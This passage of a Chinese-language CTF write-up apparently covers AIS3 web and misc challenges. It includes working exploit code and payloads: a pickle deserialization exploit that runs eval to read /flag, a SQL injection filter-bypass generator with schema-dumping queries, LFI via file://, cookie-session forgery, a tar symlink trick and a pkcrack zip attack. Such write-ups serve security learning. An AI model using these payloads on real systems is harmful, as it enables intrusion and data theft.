<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">private</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">new</span> A;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp($flag, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User(<span class="string">"1234"</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($user)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>修改 cookie 可以用 <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=zh-TW" target="_blank" rel="noopener">EditThisCookie</a></p>
<p><img src="https://i.imgur.com/jC0QA58.png" alt=""></p>
<h3 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h3><p>題目開宗明義說在同個內網其他 server 上頭有 flag</p>
<p><img src="https://i.imgur.com/m7Se733.png" alt=""></p>
<p>題目有 LFI 但是濾掉了 <code>../</code> 但是 <code>file://</code> 可以使用</p>
<p><img src="https://i.imgur.com/tSgfRYP.png" alt=""><br><img src="https://i.imgur.com/iJyL0dT.png" alt=""></p>
<p>而且有 RFI （所以可以讀同個內網底下的 ip)</p>
<p><img src="https://i.imgur.com/8CU8eHF.png" alt=""></p>
<p>題目原始碼</p>
<p><img src="https://i.imgur.com/4Dvw5Jo.png" alt=""></p>
<p>可以讀 <code>/proc/net/arp</code> 看同個內網底下的其他主機之 ip，掃過一遍就有 flag 了</p>
<p><img src="https://i.imgur.com/DXoWu0Z.png" alt=""><br><img src="https://i.imgur.com/4nwkdLq.png" alt=""></p>
<h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p><a href="https://snake.ais3.org/" target="_blank" rel="noopener">https://snake.ais3.org/</a></p>
<p>python pickle 反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">'text/plain'</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.values.get(<span class="string">'data'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> open(<span class="string">'/flag'</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> str(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br></pre></td></tr></table></figure>
<ul>
<li>細節我沒有研究，在賽中翻到一篇投影片讓我解出這題<ul>
<li><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#/" target="_blank" rel="noopener">Security Issues in Python Pickle</a></li>
<li>這題沒有過濾任何字元，所以可以用最簡單的 exp 過</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aaa</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval, (<span class="string">"open('/flag').read()"</span>,))</span><br><span class="line"></span><br><span class="line">obj = aaa()</span><br><span class="line">print(base64.b64encode(pickle.dumps(obj)))</span><br><span class="line">s = base64.b64encode(pickle.dumps(obj))</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'https://snake.ais3.org/?data=&#123;&#125;'</span>.format(s.decode(<span class="string">'utf-8'</span>)))</span><br><span class="line">print(r.text)</span><br><span class="line"><span class="comment"># AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Owl"><a href="#Owl" class="headerlink" title="Owl"></a>Owl</h3><p><img src="https://i.imgur.com/3CGKKPC.png" alt=""></p>
<p>題目有個登入框，上頭有個小字寫要猜密碼，<code>admin/admin</code> 可以登入</p>
<p><img src="https://i.imgur.com/QiMqSaA.png" alt=""></p>
<p>登入後看HTML 原始碼，發現它送你 php 原始碼，在 <code>/?source</code><br><a href="https://pastebin.com/Njhux46u" target="_blank" rel="noopener">完整原始碼</a><br>看到 sql 就知道這題是 SQLi ㄌ</p>
<p><img src="https://i.imgur.com/VERg9Sw.png" alt=""></p>
<p>看到 login 的邏輯部分，發現它用黑名單過濾，並且只用 <code>str_ireplace</code> 來取代兩遍字串<br>這種字串取代的過濾方法總是有方法可以 bypass，這裡的解法是：把 replace 的字插在原本字串的中間，過濾幾次就插幾次</p>
<ul>
<li>例如 <code>selselselectectect</code> -&gt; <code>select</code><ul>
<li>第一次<code>str_ireplace()</code>：<ul>
<li><code>selsel[select]ectect</code> = <code>selselectect</code></li>
</ul>
</li>
<li>第二次<code>str_ireplace()</code>：<ul>
<li><code>sel[select]ect</code> = <code>select</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>可以寫個簡單的腳本自動轉換，方便寫 exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inj = <span class="string">'payload'</span>;</span><br><span class="line">$username = <span class="string">"' or 1=1 union select 1,2,3 limit 0,1///***"</span>;</span><br><span class="line"></span><br><span class="line">$username = str_ireplace(<span class="string">'union'</span>, <span class="string">"unununionionion"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">'or'</span>, <span class="string">"ooorrr"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">'select'</span>, <span class="string">"selselselectectect"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">'where'</span>, <span class="string">"whewhewhererere"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">'from'</span>, <span class="string">"frfrfromomom"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">' '</span>, <span class="string">"///******///"</span>, $username);</span><br><span class="line">$username = str_ireplace(<span class="string">'--'</span>, <span class="string">"-//**-"</span>, $username);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line">$bad = [<span class="string">' '</span>, <span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'select'</span>, <span class="string">'union'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'where'</span>, <span class="string">'from'</span>, <span class="string">'--'</span>];</span><br><span class="line">$username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line">$username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且他的 DB 是 <code>SQLite</code></p>
<p><img src="https://i.imgur.com/L41ty7G.png" alt=""></p>
<p>用 <code>union select</code> 測出總欄位數量及回顯欄位：<code>&#39; or 1=1 union select 1,2,3 limit 0,1///***</code><br>要注意的是 <code>LIMIT 0,1</code> 有時候你的 result 不會在第一個 row ，回顯結果會是 <code>root</code>，賽中害我卡超久幹</p>
<p><img src="https://i.imgur.com/40vZWP6.png" alt=""></p>
<p>去 <code>sql_master</code> 撈所有的 Table Schema，得到所有的表名及欄位名稱：<code>select group_concat(sql) from sqlite_master where type=&#39;table&#39;</code></p>
<p><img src="https://i.imgur.com/AJkOCWH.png" alt=""></p>
<p>花點時間找後就會發現 flag 在 <code>garbage</code> 裡頭：<code>select group_concat(value) from garbage</code></p>
<p><img src="https://i.imgur.com/C3fhAqS.png" alt=""></p>
<h3 id="Rhino"><a href="#Rhino" class="headerlink" title="Rhino"></a>Rhino</h3><p><a href="https://rhino.ais3.org/" target="_blank" rel="noopener">https://rhino.ais3.org/</a></p>
<p><img src="https://i.imgur.com/wpmIz2I.png" alt=""></p>
<p>觀察 <code>robots.txt</code> 發現我們要的 <code>flag.txt</code> 就在網站的根目錄<br>直接讀 <code>flag.txt</code> 發現會被擋下來</p>
<p><img src="https://i.imgur.com/VLIi0Gg.png" alt=""></p>
<p><img src="https://i.imgur.com/qNPnsyz.png" alt=""></p>
<p>題目是用 <code>express.js</code> ，可以讀得到 <code>package.json</code>，並可以發現 <code>chill.js</code> 的存在</p>
<ul>
<li><p><code>package.json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"app"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"node chill.js"</span>,</span><br><span class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">"djosix"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"cookie-session"</span>: <span class="string">"^1.4.0"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.17.1"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>chill.js</code></p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  secret: <span class="string">"I'm watching you."</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'./'</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flag.txt'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> n = req.session.magic;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &amp;&amp; (n + <span class="number">420</span>) === <span class="number">420</span>)</span><br><span class="line">    res.sendFile(<span class="string">'/flag'</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.send(<span class="string">'you are a sad person too'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'*'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).sendFile(<span class="string">'404.html'</span>, &#123; <span class="attr">root</span>: __dirname &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure>
<p>想法：路由<code>flag.txt</code> 會檢查 cookie-session 內的 magic 是否通過 <code>if (n &amp;&amp; (n + 420) === 420)</code>，而加密此 cookie 的 key 也送你了<br>所以可以在本地建一個測試站，並想辦法 bypass <code>if (n &amp;&amp; (n + 420) === 420)</code> 之後複製 cookie 給真的題目就好</p>
<ul>
<li><p>如何在本地 setup 測試環境？</p>
<ul>
<li>將 <code>package.json</code> 與 <code>chill.js</code> 存下來<ul>
<li>記得修改 chill.js 中的 <code>port</code></li>
</ul>
</li>
<li><code>npm install</code> 下載所需 libraries</li>
<li><code>npm start</code> 啟動伺服器</li>
</ul>
</li>
<li><p>如何 bypass <code>if (n &amp;&amp; (n + 420) === 420)</code></p>
<ul>
<li>float 精度<br><img src="https://i.imgur.com/RnBVuoB.png" alt=""></li>
</ul>
</li>
</ul>
<p>最後複製 <code>express:sess</code> 與 <code>express:sess.sig</code> 給 <code>rhino.ais3.org</code> 後存取 <code>rhino.ais3.org/flag.txt</code>，成功拿到 flag</p>
<p><img src="https://i.imgur.com/hyBpVhq.png" alt=""></p>
<p>這題我是賽後才解出來，賽中一直卡在一個地方，直到賽後別人跟我說要怎麼 bypass <code>if(n &amp;&amp; (n + 420) == 420)</code> 那邊QQ<br>一開始我還一直往 object 那邊想QQ</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Karuego"><a href="#Karuego" class="headerlink" title="Karuego"></a>Karuego</h3><p>zip 已知明文攻擊</p>
<p>題目是一張圖片，果斷用 <code>binwalk</code> 看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 2880 x 1492, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">41            0x29            Zlib compressed data, compressed</span><br><span class="line">2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files&#x2F;</span><br><span class="line">2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files&#x2F;3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</span><br><span class="line">2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files&#x2F;Demon.png</span><br><span class="line">3260899       0x31C1E3        End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure></p>
<p>一個正常的 png 長這樣，跟上頭比較可以發現上頭的檔案後面多了 zip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 313 x 313, 1-bit colormap, non-interlaced</span><br><span class="line">72            0x48            Zlib compressed data, best compression</span><br></pre></td></tr></table></figure>
<p>裡頭的 png 可以在 google 找到：<br><img src="https://i.imgur.com/Nl00idU.png" alt=""></p>
<p>把 zip 從 jpg 中拆開：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 dd</span><br><span class="line">dd if&#x3D;.&#x2F;Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png bs&#x3D;1 count&#x3D;1201353 skip&#x3D;2059568 of&#x3D;plain.zip</span><br><span class="line"># 使用 binwalk</span><br><span class="line">binwalk -e .&#x2F;Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png</span><br></pre></td></tr></table></figure>
<p>把剛剛下載的 <code>3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</code> 放到路徑 <code>files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg</code> 並壓縮起來 (<code>plain.zip</code>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir files &amp;&amp; mv 3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg files</span><br><span class="line">zip -r plain.zip files</span><br><span class="line"><span class="comment"># adding: files/ (stored 0%)</span></span><br><span class="line"><span class="comment"># adding: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg (deflated 0%)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 pkcrack 進行已知明文攻擊<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pkcrack -C ./target.zip -c files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg -P ./plain.zip -p files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg -d ok.zip</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># Ta-daaaaa! key0=9237ea20, key1=cf7dddf2, key2=dec3715e</span></span><br><span class="line"><span class="comment"># Probabilistic test succeeded for 18584 bytes.</span></span><br><span class="line"><span class="comment"># Stage 2 completed. Starting zipdecrypt on Wed Jun 24 20:59:25 2020</span></span><br><span class="line"><span class="comment"># Decrypting files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg (92bf2f95a9d174734b346f21)... OK!</span></span><br><span class="line"><span class="comment"># Decrypting files/Demon.png (e2b00708877d5ef45c82e286)... OK!</span></span><br><span class="line"><span class="comment"># Finished on Wed Jun 24 20:59:25 2020</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>得到 flag:<br><img src="https://i.imgur.com/YZiFnNt.jpg" alt=""></p>
<h3 id="Shichirou"><a href="#Shichirou" class="headerlink" title="Shichirou"></a>Shichirou</h3><p>這題可以上傳一個檔案，上傳後的檔案會用 <code>tar</code> 解開並放在一層目錄下，之後會用 <code>sha1</code> 檢驗解壓出來的 <code>guess.txt</code> 看有沒有跟 <code>flag.txt</code> 一樣</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> resource</span><br><span class="line"></span><br><span class="line">resource.setrlimit(resource.RLIMIT_FSIZE, (<span class="number">65536</span>, <span class="number">65536</span>))</span><br><span class="line">os.chdir(os.environ[<span class="string">'HOME'</span>])</span><br><span class="line"></span><br><span class="line">size = int(sys.stdin.readline().rstrip(<span class="string">'\r\n'</span>))</span><br><span class="line"><span class="keyword">if</span> size &gt; <span class="number">65536</span>:</span><br><span class="line">    print(<span class="string">'File is too large.'</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line">data = sys.stdin.read(size)</span><br><span class="line"><span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">'w+'</span>, suffix=<span class="string">'.tar'</span>, delete=<span class="literal">True</span>, dir=<span class="string">'.'</span>) <span class="keyword">as</span> tarf:</span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory(dir=<span class="string">'.'</span>) <span class="keyword">as</span> outdir:</span><br><span class="line">        tarf.write(data)</span><br><span class="line">        tarf.flush()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.check_output([<span class="string">'/bin/tar'</span>, <span class="string">'-xf'</span>, tarf.name, <span class="string">'-C'</span>, outdir])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'Broken tar file.'</span>)</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = subprocess.check_output([<span class="string">'/usr/bin/sha1sum'</span>, <span class="string">'flag.txt'</span>])</span><br><span class="line">            b = subprocess.check_output([<span class="string">'/usr/bin/sha1sum'</span>, os.path.join(outdir, <span class="string">'guess.txt'</span>)])</span><br><span class="line">            a = a.split(<span class="string">b' '</span>)[<span class="number">0</span>]</span><br><span class="line">            b = b.split(<span class="string">b' '</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">assert</span> len(a) == <span class="number">40</span> <span class="keyword">and</span> len(b) == <span class="number">40</span></span><br><span class="line">            <span class="keyword">if</span> a != b:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">'sha1'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'Different.'</span>)</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        print(open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>).readline())</span><br></pre></td></tr></table></figure>
<p>想法：<code>sha1sum</code> 可以接 symlink 的檔案，所以可以讓 <code>guess.txt</code> 指向上一層的 <code>flag.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">lrwxr-xr-x 1 roy4801   11 Jun  8 00:55 guess.txt -&gt; ../flag.txt</span><br><span class="line">...</span><br><span class="line">$ sha1sum guess.txt</span><br><span class="line">1d229271928d3f9e2bb0375bd6ce5db6c6d348d9  guess.txt</span><br><span class="line">$ sha1sum ../flag.txt</span><br><span class="line">1d229271928d3f9e2bb0375bd6ce5db6c6d348d9  ../flag.txt</span><br></pre></td></tr></table></figure>
<p>然後把 <code>guess.txt</code> 用 <code>tar</code> 包起來就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">'60.250.197.227'</span></span><br><span class="line">port = <span class="number">11000</span></span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test.tar'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">r.sendline(str(len(d)))</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(d)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># AIS3&#123;Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Soy"><a href="#Soy" class="headerlink" title="Soy"></a>Soy</h3><p><img src="https://i.imgur.com/VemYvKF.png" alt=""></p>
<p>這題就給一個有損壞的 QR Code，用<a href="https://merricx.github.io/qrazybox/" target="_blank" rel="noopener">工具</a>還原</p>
<ul>
<li>這邊有幾篇不錯的資源<ul>
<li><a href="http://www.datagenetics.com/blog/november12013/" target="_blank" rel="noopener">http://www.datagenetics.com/blog/november12013/</a></li>
<li><a href="https://stackoverflow.com/questions/13329406/analyze-partial-or-corrupted-qr-codes" target="_blank" rel="noopener">https://stackoverflow.com/questions/13329406/analyze-partial-or-corrupted-qr-codes</a></li>
<li><a href="https://blog.xiafeng2333.top/ctf-13/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/ctf-13/</a></li>
</ul>
</li>
</ul>
<h3 id="Saburo"><a href="#Saburo" class="headerlink" title="Saburo"></a>Saburo</h3><p>這題是給你一個伺服器位置，連上去後會叫你輸入 flag 的字元，如果字元正確的話數字會比較大，錯誤則會比較小，且數字會浮動，所以要寫腳本</p>
